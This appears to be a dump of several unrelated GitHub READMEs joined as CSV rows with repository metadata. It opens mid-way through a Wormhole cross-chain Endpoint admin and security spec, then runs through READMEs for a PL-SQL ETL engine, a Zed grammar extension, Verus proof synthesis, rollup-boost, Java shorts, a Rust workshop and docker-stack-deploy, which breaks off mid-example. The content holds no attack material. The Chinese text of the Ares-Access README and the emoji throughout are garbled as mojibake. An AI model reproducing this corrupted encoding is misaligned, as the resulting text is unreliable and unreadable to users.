  - In order to reduce integrator / user costs, upon the last enabled sending Adapter's pickup, any outgoing message state MUST be cleared.

The Endpoint MUST contain the following functionality for an Admin

- `updateAdmin(integratorAddr, newAdmin)`
  - MUST check that the caller is the current admin and there is not a pending transfer.
  - If possible, MUST NOT allow the admin to discard admin via this command (e.g. `newAdmin != address(0)` on EVM).
  - Immediately sets `newAdmin` as the admin of the integrator.
- `transferAdmin(integratorAddr, newAdmin)`
  - MUST check that the caller is the current admin and there is not a pending transfer.
  - If possible, MUST NOT allow the admin to discard admin via this command (e.g. `newAdmin != address(0)` on EVM).
  - Initiates the first step of a two-step process in which the current admin (to cancel) or new admin must claim.
- `claimAdmin(integratorAddr)`
  - MUST check that the caller is the current admin OR the pending admin.
  - MUST check that there is an admin transfer pending (e.g. pendingAdmin != address(0) on EVM).
  - Cancels / Completes the second step of the two-step transfer. Sets the admin to the caller and clears the pending admin.
- `discardAdmin(integratorAddr)`
  - MUST check that the caller is the current admin and there is not a pending transfer.
  - Clears the current admin. THIS IS NOT REVERSIBLE. This ensures that the Integrator configuration becomes immutable.
- `addAdapter(integratorAddr, adapterAddr)`
  - MUST check that the caller is the current admin and there is not a pending transfer.
  - MUST check that `adapterAddr` is not already in the array.
  - MUST check that the array would not surpass 128 entries.
  - Appends the `adapterAddr` to the Integrator's array of Adapters. THIS IS NOT REVERSIBLE. Once an adapter is added for an Integrator, it cannot be removed.
  - Note: When an Adapter is added, it is not enabled for sending or receiving on any chain.
- `enableSendAdapter(integratorAddr, chain, adapterAddr)`
  - MUST check that the caller is the current admin and there is not a pending transfer.
  - MUST check that the `adapterAddr` is in the Integrator's array of Adapters.
  - MUST check that the `adapterAddr` is currently disabled for sending to the given chain.
  - Enables the Adapter for sending to the given chain.
- `disableSendAdapter(integratorAddr, chain, adapterAddr)`
  - MUST check that the caller is the current admin and there is not a pending transfer.
  - MUST check that the `adapterAddr` is in the Integrator's array of Adapters.
  - MUST check that the `adapterAddr` is currently enabled for sending to the given chain.
  - Disables the Adapter for sending to the given chain.
- `enableRecvAdapter(integratorAddr, chain, adapterAddr)`
  - MUST check that the caller is the current admin and there is not a pending transfer.
  - MUST check that the `adapterAddr` is in the Integrator's array of Adapters.
  - MUST check that the `adapterAddr` is currently disabled for receiving from the given chain.
  - Enables the Adapter for receiving from the given chain.
- `disableRecvAdapter(integratorAddr, chain, adapterAddr)`
  - MUST check that the caller is the current admin and there is not a pending transfer.
  - MUST check that the `adapterAddr` is in the Integrator's array of Adapters.
  - MUST check that the `adapterAddr` is currently enabled for receiving from the given chain.
  - Disables the Adapter for receiving from the given chain.

## Caveats

### Non-Upgradeable, Non-Pause-able, Append-Only

The purpose of the Endpoint is to be a protocol agnostic, shared piece of on-chain infrastructure. As such, it must not, itself, inherit the security risks of any of the protocols an integrator might choose. For example, if the Endpoint were to be governed by Wormhole governance, a Wormhole governance related exploit could make an Integrator vulnerable to the exact risk they were attempting to avoid by choosing a 2-of-2 with Axelar and Wormhole. Furthermore, the Endpoint may be used by Integrators to perform cross-chain governance. For example, it is possible that they could be in a position where they require a working, but potentially vulnerable, Adapter in order to switch their configuration to a new one.

The append-only requirement refers to items in arrays or maps which, once added, cannot be removed. This is critical to the ensure acceptable trust criteria for Integrators. For example, once an Adapter admin sets a peer Adapter on another chain, they MUST not be able to change it. Allowing this would mean that once an Adapter becomes used by an Integrator, an admin could switch the peer from the reviewed one (which the Integrator accepted the risk of) to one controlled by the admin (or their exploiter), targeting any Integrator functionality controlled by this Adapter.

### Chain ID

In order for the Endpoint and Adapters to function across a myriad of chains, protocols, and runtimes, there must exist agreed upon universal chain identification system. This design uses the [Wormhole Chain ID](https://github.com/wormhole-foundation/wormhole/blob/main/whitepapers/0001_generic_message_passing.md#security-considerations), which is represented as a `u16`. This does mean that Adapter developers / admins should always ensure that a Wormhole Chain ID is reserved for the given chain instead of arbitrarily picking a `u16`. Given that Integrators can choose to use any combination of Adapters, it is **critical** that each Adapter uses the same chain ID to refer to the same actual blockchain instance. To better support this requirement, Wormhole Chain IDs and associated packages should be moved to a new repository.

### Relaying

This design _explicitly_ does not handle message execution, i.e. calling a method on the receiving contract to execute arbitrary code. This decision is made, in part, because arbitrary execution has not been solved on all of the targeted runtimes. Additionally, having the attestation framework explicitly handle execution, like [the current NTT approach on EVM](https://github.com/wormhole-foundation/example-native-token-transfers/blob/68a7ca4132c74e838ac23e54752e8c0bc02bb4a2/evm/src/NttManager/NttManager.sol#L195-L197), makes it impossible to accurately quote a relay price for the attestation when using more than one Adapter. Since it cannot be known which attestation will be relayed first, the user must pay a higher up-front cost for _all_ relays to potentially include execution. This decision also prevents the need for the Endpoint to handle custom gas forwarding beyond what is required by the Adapter when sending a message.

Wormhole Standard Relayer leverages Wormhole Core VAAs to encode and verify relay requests, which significantly increases the cost of relays. With this design, attestations are verified separately from execution, so it allows for composition with any relayer in a trustless fashion. This should allow for future improvements to message execution without changes to this framework.

### Transceiver Instructions

Fundamentally, this design decision comes down to a separation of concerns. The Adapter implementation details should not bleed into all potential upstream Integrators and, subsequently, their integrators and tooling.

The existing EVM NTT Transceiver design includes a [TransceiverInstruction](https://github.com/wormhole-foundation/example-native-token-transfers/blob/b2ecf88c8840de7335b035b24d7f7a299862e2a6/evm/src/libraries/TransceiverStructs.sol#L309-L318) struct. Used on the sending side, this can pass-through arbitrary bytes (up to a length of 255) to an Transceiver at a given index. This introduces an Integrator and upstream (e.g. Connect SDK/UI) pain-point when these instructions expose upstream dependencies or additional, on-the-fly configuration, as it may impose different on- and off-chain requirements for each Transceiver used by an integrator. Today, only the [WormholeTransceiver](https://github.com/wormhole-foundation/example-native-token-transfers/blob/b2ecf88c8840de7335b035b24d7f7a299862e2a6/evm/src/Transceiver/WormholeTransceiver/WormholeTransceiver.sol#L128-L140) supports a custom TransceiverInstruction, which is used to skip relaying (if it is configured and the corresponding byte is set). Since this design explicitly states that Adapters SHOULD avoid branching logic and the Endpoint should offer a uniform experience, this field has been dropped. This may impact future Adapters which desire to use additional information which is not provided by the interface - examples may include an Axelar Adapter which uses off-chain gas quotes or Wormhole Standard Relayer Adapter which uses signed off-chain gas quotes. It should be noted again that, unlike the existing NTT design, these Adapters are ONLY for relaying attestations. It is, however, possible for those use cases to be accommodated by the Integrator explicitly calling a method on the Adapter directly, interim state being stored, and read/cleared when `sendMessage` is called, though this once again bleeds Adapter implementation detail into the Integrator contract.

For clarity, some optionality can be covered by separate Adapter deployments. For example, the `consistency_level` for Wormhole finality can be an immutable in the Wormhole Adapter, with an entirely independent network of Adapters for `instant`, `safe`, and `finalized`.

## Alternatives Considered

### Message ID

NTT uses a [32-byte message ID](https://github.com/wormhole-foundation/example-native-token-transfers/blob/main/docs/NttManager.md#message-specification) instead of explicitly using a sequence number like [Wormhole Core](https://github.com/wormhole-foundation/wormhole/blob/main/whitepapers/0001_generic_message_passing.md#detailed-design). The EVM implementation does track a sequence number as a `u64` which it [left-pads](https://github.com/wormhole-foundation/example-native-token-transfers/blob/68a7ca4132c74e838ac23e54752e8c0bc02bb4a2/evm/src/NttManager/NttManager.sol#L510) to `bytes32` as the identifier. Meanwhile, the Solana implementation uses the [public key of the outbox account](https://github.com/wormhole-foundation/example-native-token-transfers/blob/68a7ca4132c74e838ac23e54752e8c0bc02bb4a2/solana/programs/example-native-token-transfers/src/adapters/wormhole/instructions/release_outbound.rs#L75). This Solana implementation detail, combined with the fact that the outbox account is an arbitrary account (as it could not be a PDA by sequence number due to a race-condition between users for the next sequence number), results in the necessity to leave that account open, else it could inadvertently be reused by an otherwise-identical message and lead to a loss-of-funds. At the time of this writing, the base rent-exemption for an account on Solana is `0.00089088 SOL`, which at a price of ~$135, is about $0.12. Since the goal of this design is to support future messaging improvements and optimizations, it should avoid imposing additional costs wherever feasible. Therefore, a sequence number shall be used everywhere, akin to Wormhole Core.

### All-Chain Adapter Bitmaps

The v1 `NttManager` design features Adapter configuration that enables / disables Adapters across all-chains and all-directions along with a single threshold. That prohibits several integrator use cases, for example:

- 2-of-2 between EVM chains that support Wormhole and Axelar, but 1-of-1 between EVM and Solana which only supports Wormhole.
- 2-of-2 from Ethereum to Optimism via Wormhole and the native bridge, but 1-of-1 back from Optimism to Ethereum via Wormhole to avoid waiting for the native bridge challenge period.

Furthermore, this design explicitly drops a separate configuration for enabling / disabling adapters across all chains as it incurs an unnecessary additional state read and logic.

### Per-Chain Adapter Lists

It would be conceivable to have a different list of Adapters per-chain, allowing for up to 128 unique Adapters used for sending or receiving between each chain. However, this would mean that different bits could refer to different Adapters for the same integrator and could lead to confusion in disabling/enabling Adapters for different chains. As designed, it allows for a simple table to be constructed. e.g. on Ethereum

| Adapters / Chains | Wormhole | OP Native | Base Native |
| ----------------- | -------- | --------- | ----------- |
| Solana            | ‚úÖ       | ‚ùå        | ‚ùå          |
| Optimism          | ‚úÖ       | ‚úÖ        | ‚ùå          |
| Base              | ‚úÖ       | ‚ùå        | ‚úÖ          |

## Security Considerations

The Endpoint can be thought of as a shared piece of on-chain infrastructure. The canonical deployments MUST be verifiable and MUST NOT have upgradability. The ability to manage adapters MUST be restricted (permissioned) to an Integrator-specified administrator. Attesting to a message MUST be restricted (permissioned) to those Adapters which an integrator has explicitly added. The Integrator's choice of Adapter MUST be unrestricted (other than by compatibility).

Adapters MAY be permissioned or permissionless, though they MUST adhere to the aforementioned design standard to be recommended for broader ecosystem use. They MUST interact with one and only one Endpoint so that the stack has a known risk profile and Adapters cannot convolute messages between Endpoints.

When message passing via the Endpoint, executing relayers become trustless for Integrators.
",0,9,5,NOASSERTION,"aptos.yml,evm.yml,format.yml,svm.yml",35.0
rewerma/ares,main,"# Ares-Access

## ÁõÆÂΩï

- [Ê¶ÇËßà](#Ê¶ÇËßà)
- [Âø´ÈÄüÂºÄÂßã](docs/zh/start/quick-start-ares.md)
- [ÂÆâË£Ö](docs/zh/start/deployment.md)
- [PL-SQLËØ≠Ê≥ï](docs/zh/plsql/ares-plsql.md)
- [ËØ≠Ê≥ïÁ§∫‰æã](#ËØ≠Ê≥ïÁ§∫‰æã)

## Ê¶ÇËßà

Ares-Access ÊòØÂü∫‰∫é `PL-SQL` ËØ≠Ê≥ïÁöÑ ETL„ÄÅË∑®Ê∫êËÆ°ÁÆó„ÄÅÊï∞ÊçÆÂàÜÊûê„ÄÅÂ≠òËÆ°ÂàÜÁ¶ªÁöÑÊï∞ÊçÆËÆ°ÁÆóÈõÜÊàêÂºïÊìé„ÄÇ

![Êû∂ÊûÑÊµÅÁ®ãÂõæ](docs/ares.png)

- ÂäüËÉΩÁâπÊÄß1ÔºöÊîØÊåÅÂ§öÁßçÊï∞ÊçÆÊ∫êËøûÊé•ÔºåÂåÖÊã¨ `Mysql`, `Oracle`, `SQLServer`, `PostgreSQL`, `Hive`, `HDFS`, `FTP`, `SFTP` Á≠âÔºõ
- ÂäüËÉΩÁâπÊÄß2ÔºöÊîØÊåÅË∑®Ê∫êËÆ°ÁÆóÔºåÂèØ‰ª•ËøûÊé•Â§ö‰∏™Ê∫êÁ´ØÂä†ËΩΩÊï∞ÊçÆÂà∞AresÂºïÊìéÂπ∂ÈÄöËøáSparkËøõË°åÂàÜÂ∏ÉÂºèËÆ°ÁÆóÔºåÊúÄÂêéÂ∞ÜÁªìÊûúËæìÂá∫Âà∞ÁõÆÊ†áÁ´ØÔºõ
- ÂäüËÉΩÁâπÊÄß3ÔºöÊîØÊåÅ‰∏∞ÂØåÁöÑDML-SQLËØ≠Ê≥ïÔºåÂåÖÊã¨Ôºö`INSERT`, `UPDATE`, `DELETE`, `MERGE`, `TRUNCATE`Á≠âÔºàÈÉ®ÂàÜÁõÆÊ†áÁ´Ø‰ªÖÊîØÊåÅ`INSERT`ÔºâÔºõ
- ÂäüËÉΩÁâπÊÄß4ÔºöÊîØÊåÅ‰∏∞ÂØåÁöÑËøáÁ®ãËØ≠Ê≥ïÔºåÂåÖÊã¨Ôºö`CREATE PROCEDURE`, `CREATE FUNCION`, `IF`, `FOR`, `WHILE`, `CURSOR`,  `EXCEPTION`Á≠âÔºåËØ¶ÁªÜÂèÇËßÅÔºö[PL-SQLËØ≠Ê≥ï](docs/zh/plsql/ares-plsql.md)
- ÂäüËÉΩÁâπÊÄß5ÔºöÊîØÊåÅ‰∏∞ÂØåÁöÑÊï∞ÊçÆÁ±ªÂûãÔºö`INT`, `BIGINT`, `NUMBER`, `VARCHAR`, `DATE`, `TIMESTAMP` Á≠âÔºõ
- ÂäüËÉΩÁâπÊÄß6ÔºöÊîØÊåÅËøáÁ®ãÂáΩÊï∞Êï¥ÂêàSQL-UDFÔºöÂú®ËøáÁ®ãËØ≠Ë®Ä‰∏≠ÂÆö‰πâÁöÑ`CREATE FUNCTION`ÂèØ‰ª•Áõ¥Êé•Âú®SQL‰∏≠‰ΩøÁî®ÔºåÂπ∂ÊîØÊåÅÂ§öÁßçÊï∞ÊçÆÁ±ªÂûãÔºõ

## ËØ≠Ê≥ïÁ§∫‰æã

### ËØ≠Ê≥ïÁ§∫‰æã1

```sql
SET datasource.mytest.connector=jdbc;
SET datasource.mytest.url=jdbc:mysql://127.0.0.1:3306/mytest?useSSL=false;
SET datasource.mytest.driver=com.mysql.cj.jdbc.Driver;
SET datasource.mytest.user=root;
SET datasource.mytest.password=123456;

CREATE TABLE test1
WITH (
    'datasource' = 'mytest',
    -- 'query'='select * from t_user',
    'table_name'='t_user',
    'type' = 'source,sink'
);

CREATE TABLE test2
WITH (
    'datasource' = 'mytest',
    'table_name'='t_user1',
    'type' = 'source,sink'
);

SELECT * FROM test1 LIMIT 20;

TRUNCATE TABLE test2;

INSERT INTO test2 (id, name, c_time) SELECT id, name, c_time FROM test1 WHERE id > 0 LIMIT 100;

UPDATE test2 a, test1 b SET a.name = b.name||'_', a.c_time = to_timestamp(date_add(b.c_time, 1)||' '||date_format(b.c_time, 'HH:mm:ss')) WHERE a.id = b.id;

DELETE FROM test2 a, (SELECT * FROM test1 WHERE id>3) b WHERE a.id = b.id;

MERGE INTO test2 tu2
USING (SELECT * FROM test1) tu
ON (tu2.id=tu.id)
WHEN NOT MATCHED THEN
    INSERT (tu2.id, tu2.name, tu2.c_time)
        VALUES (tu.id, tu.name, tu.c_time)
WHEN MATCHED THEN
    UPDATE SET tu2.name = tu.name, tu2.c_time = tu.c_time;

DECLARE
    cnt INT := 0;
BEGIN
    SELECT COUNT(*) INTO :cnt FROM test1;
    PUT_LINE('Total records: '||:cnt);
END;
```

### ËØ≠Ê≥ïÁ§∫‰æã2

```sql
CREATE FUNCTION test(num INT) RETURN INT AS
BEGIN
    RETURN num + 1;
END;

PUT_LINE(test(-1));

SELECT test(10) as test;
```
### ËØ≠Ê≥ïÁ§∫‰æã3

```sql
CREATE PROCEDURE test(p1 IN INT, p2 IN NUMBER) AS
    a VARCHAR := 'test';
    b INT := 1;
    c TIMESTAMP := '2021-01-01 12:23:34.567';
    d NUMBER(10, 2) := 1.124;
BEGIN
    PUT_LINE(d);
    WHILE b <= p1 LOOP
        PUT_LINE('Current index: '||b);
        IF b > 2 THEN
            PUT_LINE('Exit while loop!');
            EXIT;
        END IF;
        b := b + 1;
    END LOOP;
END;

CALL test(5, 3.14);


CREATE PROCEDURE test2(p1 IN INT, p2 IN NUMBER, p3 OUT VARCHAR) AS
BEGIN
    p3 := (p1 * p2) || '_';
END;

DECLARE
    v1 VARCHAR;
BEGIN
    test2(2, 3.14, v1);
    put_line('Result: '||v1);
END;
```

### ËØ≠Ê≥ïÁ§∫‰æã4

```sql
CREATE TABLE test1
WITH (
    'connector' = 'fake',
    'schema' = '{""fields"":{""id"":""bigint"",""name"":""string"",""c_time"":""timestamp""}}',
    'rows' = '[{""fields"":[1, ""Eric"", ""2021-01-01 12:23:34""]},
               {""fields"":[2, ""Andy"", ""2022-03-11 11:23:34""]},
               {""fields"":[3, ""Joker"", ""2024-11-04 10:23:34""]}]',
    'type' = 'source'
);

DECLARE
    i INT := 0;
    e INT := 5;
BEGIN
    WHILE i < 5 LOOP
        IF i > 2 THEN
            EXIT;
        END IF;
        PUT_LINE('INDEX: ' || i);
        i := i + 1;
    END LOOP;

    FOR j IN 1..e LOOP
        IF j = 3 THEN
            EXIT;
        END IF;
        PUT_LINE('INDEX: ' || j);
    END LOOP;

    FOR cur IN (select * from test1) LOOP
        println(cur.id||' '||cur.name||' '||cur.c_time);
    END LOOP;
END;
```

## ÊâßË°åÁ§∫‰æã

Local:
``` bash
./bin/ares-local-starter.sh --sql /path/to/sample.sql 
``` 

Spark3:
``` bash
./bin/start-ares-spark3-connector.sh --sql /path/to/sample.sql --master spark://127.0.0.1:7077 
``` 

Spark2:
``` bash
./bin/start-ares-spark2-connector.sh --sql /path/to/sample.sql --master spark://127.0.0.1:7077 
``` ",0,0,3,,maven.yml,2.0
Stef16Robbe/harper_zed,main,"# harper_zed

Zed extension for the
[Harper Grammar Checker](https://github.com/elijah-potter/harper) LS.

![Harper running inside zed](./images/zed_demo.png)

## Supported platforms

| Platform | X86_64 | ARM64 |
|---|---|---|
| Linux | ‚úÖ | ‚úÖ |
| MacOS | ‚úÖ | ‚úÖ |
| Windows | ‚úÖ | ‚ùå |

## Install

1. [Open the Extension Gallery](https://zed.dev/docs/extensions/installing-extensions)
2. Search for `harper` in the Gallery
3. Click ""Install""!

![Harper in the Zed Extension Gallery](./images/extension_in_gallery.png)

## Acknowledgments

- [elijah-potter](https://github.com/elijah-potter) for creating Harper
- [WeetHet](https://github.com/WeetHet) for their
  [typst LS extension](https://github.com/WeetHet/typst.zed) which was used as
  inspiration for this repository :)
",4,2,1,Apache-2.0,,4.0
microsoft/verus-proof-synthesis,main,"# <img src=""assets/logo.png"" alt=""Project logo"" width=""40"" /> Verus Proof Synthesis

<p align=""left"">
    <a href=""https://arxiv.org/abs/2409.13082""><img src=""https://img.shields.io/badge/arXiv-2409.13082-b31b1b.svg?style=for-the-badge"">
    <a href=""https://sites.google.com/view/autoverus""><img src=""https://img.shields.io/badge/Website-blue.svg?style=for-the-badge"">
</p>

![Framework](assets/framework.png)

This repository contains code for automated Verus proof synthesis.

* `benchmarks`. This folder contains a number of Rust/Verus proof tasks, including all the 150 proof tasks referred to as <i>VerusBench</i> in our techreport.
* `code`. This folder contains the python code that does proof synthesis for Verus.
* `utils/lynette`. This folder contains a Verus parser that is written to support Verus proof synthesis.

## Pre-requisites

* You need to install [Verus](https://github.com/verus-lang/verus) before using this tool
* You may need to run `cargo install verusfmt` to install the Verus formatter

## Usage

```bash
python main.py --input <input_file> --output <output_file> --config <config_file> 
```
* `--input` specify a rust file that you want to generate Verus proof for (default: input.rs)
* `--output` specify a file that you want the final output to be written in (default: output.rs)
* `--config` specify your configuration. The format of this file is shown in config.json (default: config.json)
* `--repair` specify the number of debugging rounds before giving up (default: 10) 
There are a few other parameters that you can set. Try `python main.py -h' to know more.

In addition to the final output, you will also see a folder prefixed by `intermediate-` that contains all the intermediate files generated by LLM and by our tool.

# Limitations
1. Currently, we only support synthesizing proof for one file that contains one function at a time. Support for multi-file/multi-function is our ongoing work.
2. Sometimes, the code generated by LLM may cause our lynette Verus parser to panic.
3. The output is inherently non-deterministic given the random nature of LLM.

## Further reading

[Our tech-report](https://arxiv.org/abs/2409.13082)

## Contributing

This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit https://cla.microsoft.com.

When you submit a pull request, a CLA-bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repositories using our CLA.

This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/). For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.

# Trademarks 

This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft trademarks or logos is subject to and must follow Microsoft‚Äôs Trademark & Brand Guidelines. Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship. Any use of third-party trademarks or logos are subject to those third-party‚Äôs policies.
",0,0,5,MIT,,15.0
flashbots/rollup-boost,main,"# Rollup Boost

This repo implements a proxy server for the Ethereum Engine API and is under active development. To read more about the design, check out the [design doc](https://github.com/ethereum-optimism/design-docs/pull/86).


## Usage

Run the server using the following command:

```
cargo run -- [OPTIONS]
```

### Command-line Options

- `--jwt-token <TOKEN>`: JWT token for authentication (required)
- `--jwt-path <PATH>`: Path to the JWT secret file (required if `--jwt-token` is not provided)
- `--l2-url <URL>`: URL of the local L2 execution engine (required)
- `--builder-url <URL>`: URL of the builder execution engine (required)
- `--builder-jwt-token <TOKEN>`: JWT token for builder authentication. defaults to the value of `--jwt-token` if not provided
- `--builder-jwt-path <PATH>`: Path to the builder JWT secret file.
- `--rpc-host <HOST>`: Host to run the server on (default: 0.0.0.0)
- `--rpc-port <PORT>`: Port to run the server on (default: 8081)
- `--tracing`: Enable tracing (default: false)
- `--log-level <LEVEL>`: Log level (default: info)
- `--metrics`: Enable metrics (default: false)
- `--boost-sync`: Enable syncing the builder with the proposer op-node (default: false)

### Environment Variables

You can also set the options using environment variables. See .env.example to use the default values.

### Example

```
cargo run --jwt-token your_jwt_token --l2-url http://localhost:8545 --builder-url http://localhost:8546
```

## Core System Workflow

1. By default,¬†`rollup-boost`¬†forwards all JSON-RPC API calls from¬†`proposer-op-node`¬†to¬†`proposer-op-geth`.
2. When¬†`rollup-boost`¬†receives an¬†`engine_FCU`¬†with attributes (initiating block building):
    - It relays the call to¬†`proposer-op-geth`¬†as usual.
    - If¬†`builder-op-geth`¬†is synced to the chain tip, the call is also multiplexed to it.
    - The FCU call returns a PayloadID, which should be identical for both¬†`proposer-op-geth`¬†and¬†`builder-op-geth`.
3. When¬†`rollup-boost`¬†receives an¬†`engine_getPayload`:
    - It first queries¬†`proposer-op-geth`¬†for a fallback block.
    - In parallel, it queries¬†`builder-op-geth`.
4. Upon receiving the¬†`builder-op-geth`¬†block:
    - `rollup-boost`¬†validates the block with¬†`proposer-op-geth`¬†using¬†`engine_newPayload`.
    - This validation ensures the block will be valid for¬†`proposer-op-geth`, preventing network stalls due to invalid blocks.
    - If the external block is valid, it is returned to the¬†`proposer-op-node`.
5. As per its normal workflow, the¬†`proposer-op-node`¬†sends another¬†`newPayload`¬†request to the `rollup-boost` and another FCU(without) to update the state of its op-geth node.
    - In this case, the `rollup-boost` just relays the data and does not introspect anything.
    - Note that since we already tested¬†`newPayload`¬†on the proposer-op-geth in the previous step, this process should be cached. 

![Workflow Diagram](/assets/workflow.svg)

## License
The code in this project is free software under the [MIT License](/LICENSE).

---

Made with ‚òÄÔ∏è by the ‚ö°ü§ñ collective.
",0,8,18,MIT,"lint.yml,release.yml,test.yml",23.0
AdamBien/best-of-java-shorts,main,"# üöÄüéâ‚òïÔ∏è The Best of Java Shorts Show by [Adam Bien](http://about.adam-bien.com)

No dependencies, no builds, no compilation, no IDEs.

A selection of Java Shorts from http://youtube.com/bienadam/shorts which I sometimes present on conferences

## Presented at:

1. Devoxx 2024: [The Best of Java Shorts Show: 100 Snippets in 50 Minutes](https://www.youtube.com/embed/t03DOhiTPkc?rel=0)

[![Devoxx 2024: The Best of Java Shorts Show: 100 Snippets in 50 Minutes](https://i.ytimg.com/vi/t03DOhiTPkc/mqdefault.jpg)](https://www.youtube.com/embed/t03DOhiTPkc?rel=0)

[talk description](https://www.devoxx.be/talk/the-best-of-java-shorts-show-100-snippets-in-50-minutes/)

## üõ´ How to run

```shell
git clone https://github.com/AdamBien/best-of-java-shorts
cd best-of-java-shorts
java S00_BoringMain.java 
```

## üí°A ""Short"" Idea

If you have an idea for a new short, or would like to improve an existing one, just open an [issue](https://github.com/AdamBien/best-of-java-shorts/issues)

## FAQ

Q: Why there are multiple shorts with ""100""?

A: Because my ""Java Script"" had a bug and I had no time to fix it üòÄ
",0,2,1,MIT,,1.0
kvc0/rust_workshop,main,"Welcome to the Rust workshop!

Clone this repository and start working through the modules at your own pace.

**Modules:**
1. [Intro to Rust](./intro/README.md): Start here if you are new to Rust. Read the readme either way to see if you'd like a quick refresher.
1. [Sieve Cache](./sieve_cache/README.md): Learn applied rust by writing a modern cache eviction algorithm.
1. [Benchmarking](./benchmarking/README.md): Learn tools and techniques for measuring performance of Rust code.

### Prerequisites
* MacOS, Linux, or WSL. You might be able to do this with Windows, but I've not tried!
* An IDE. VS Code is a good choice, but you can use vim, emacs, or some Jetbrains thing if you prefer.
* Rust stable toolchain must be installed. [rustup](https://rustup.rs/) is the usual way.
* gcc and gnuplot for visualizations, perf for detailed profiling.
  * On MacOS `brew install gnuplot` will get you there. If you miss this, you'll just have less smooth graphs :shrug:
  * `perf` is more for linux - it's really for going deep on latency measurements with flamegraphs. We'll be using another means for flamegraphs in this workshop so MacOS people can play along, but `perf`-backed `cargo flamegraph` is an option if you like.
",0,0,1,,,2.0
wez/docker-stack-deploy,main,"# Docker-Stack-Deploy

This repo is the home of a small but powerful utility that helps you to do
gitops and maintain your docker deployments by checking in the corresponding
configuration files into a private git repo and then running `git push` for
them to take effect.

## Architecture

There are a couple of pieces:

* A private git repo that holds your infrastructure definition,
  essentially a set of directories with docker `compose.yml` files,
  and an encrypted keepass database file that holds any secrets
  that might be required by those containers.  Each of these directories
  if referred to as a ""stack"".
* One or more hosts on which you are running docker
* The `docker-stack-deploy` container that runs persistently
  on each of those docker hosts

## Getting Started

### Infrastructure Repo

If you don't already have a repo suitable for this purpose, create a new
private one on GitHub.

`docker-stack-deploy` is fairly un-opinionated about directory layout, but
for the sake of getting started:

 * You will need to create a KeePass database to hold your encrypted secrets.
   On macOS you might want to look at [Strongbox](https://strongboxsafe.com),
   which can be used for free for this purpose, but you can also use
   [KeePassXC](https://keepassxc.org) for free on macOS or any other OS.

    * Clone your infra repo locally
    * Create a new vault/database in the root of your infra repo, and name
      it `.secrets.kdbx`.  If you have the option to select the file format
      version, select `Keepass password database 2.x KDBX` in order to
      be compatible with the [rust keepass crate](https://docs.rs/keepass/latest/keepass/)
    * Use a passphrase, rather than a key file, when you configure this database.
    * You will need that passphrase when you edit the database later, and
      also to bootstrap a docker host.

 * You can now create a directory for each of your stack(s).  They can be
   anywhere in the repo; they will be located based on the `stack-deploy.toml`
   file.  I personally have some stacks deployed under `hosts/HOSTNAME/STACKNAME`
   and some under `services/STACKNAME`.  You can pick whatever organization makes
   sense to you, but each individual stack must live in its own directory.

 * In the stack directory you will need at least two files:
    * `compose.yml` - the docker stack definition
    * `stack-deploy.toml` - the definition for stack-deploy

#### Example Stack

In your infra repo, create a `minecraft` directory, and populate it:

Put this in `minecraft/compose.yml`:

```yml
services:
 minecraft:
   image: itzg/minecraft-server
   ports:
     - ""25565:25565""
   environment:
     EULA: ""TRUE""
   deploy:
     resources:
       limits:
         memory: 1.5G
   volumes:
     - minecraft_data:/data

volumes:
  minecraft_data:
```

> [!IMPORTANT]
> Avoid using local directories for mutable state, as you want to avoid dirtying
> your infrastructure repo checkout with files created by docker and potentially
> cause permission problems and potentially causing conflicts with future changes
> in your Git repo.  I recommend using docker volumes, such as the `minecraft_data`
> volume in the example above, to hold the mutable state.
> Read-only mounts using config files in your repo are fine, and I used those
> often.

And this in `minecraft/stack-deploy.toml`:

```toml
# The name of the stack. Used for dependency purposes
name = ""minecraft""

# Lists the hosts on which this stack should run.
# It should match the hostname of your docker host.
runs_on = [""mydockerhostname""]
```

Add and commit that to your infra repo and push it to github.

## Bootstrapping

You need to deploy `docker-stack-deploy` to your docker host. This is done
via a one-time bootstrap procedure.

You will need:

* The infra repo URL
* A PAT that grants access to read from the infra repo
* The passphrase for your infra keepass secrets db
* Access to the docker host

First, login to the docker host, and run the bootstrap command.
You must run this as a user that has privileges to talk to docker:

```console
$ docker run --rm -it \
    -v /var/run/docker.sock:/var/run/docker.sock \
    -v /var/lib/docker-stack-deploy:/var/lib/docker-stack-deploy \
    ghcr.io/wez/docker-stack-deploy \
    docker-stack-deploy bootstrap \
    --project-dir /var/lib/docker-stack-deploy \
    --git-url https://github.com/YOURNAME/REPO.git
Github Token:
KeePass Passphrase:
```

This will pull the deploy image and run it, and it will then prompt you
for your github token and keepass passphrase.

With that done, you can now see what is happening with the deployment:

```console
$ docker logs docker-stack-deploy --tail 100 --follow
```

after a few moments, it should have pulled and launched the minecraft
container.

`docker-stack-deploy` will pull your infra repo every 5 minutes
to look for changes. If any files have changed, it will run through
and deploy each stack.

The deploy command that gets run for each stack is:

```
docker compose up --detach --wait --remove-orphans
```

with the environment populated as described in the *Secrets* section below.

## Secrets

The standard easy way to manage secrets with docker compose is to put
them into an `.env` file in the stack directory.  While you can
do that here, it isn't ideal to check in clear-text secrets.  This is
where the KeePass database comes into play.

You can record the relevant secrets in this database and it will be
stored encrypted on disk.  With a sufficiently strong passphrase
this is a significant upgrade over clear text `.env` files.

Secrets are selectively exposed to a stack based on the instructions
in your `stack-deploy.toml` file for that stack.

For example, if you have this in `gitea/compose.yml`:

```yml
services:
  gitea:
    image: gitea/gitea:latest
    environment:
      - DB_TYPE=postgres
      - DB_HOST=db:5432
      - DB_NAME=gitea
      - DB_USER=gitea
      - DB_PASSWD=${DB_PASSWD}
    restart: always
    volumes:
      - git_data:/data
    ports:
      - 3000:3000
  db:
    image: postgres:alpine
    environment:
      - POSTGRES_USER=gitea
      - POSTGRES_PASSWORD=gitea
      - POSTGRES_DB=${DB_PASSWD}
    restart: always
    volumes:
      - db_data:/var/lib/postgresql/data
    expose:
      - 5432
volumes:
  db_data:
  git_data:
```

and this in `gitead/stack-deploy.toml`:

```toml
name = ""gitea""

[secret_env]
DB_PASSWD = 'Database/Gitea Postgres DB/password'
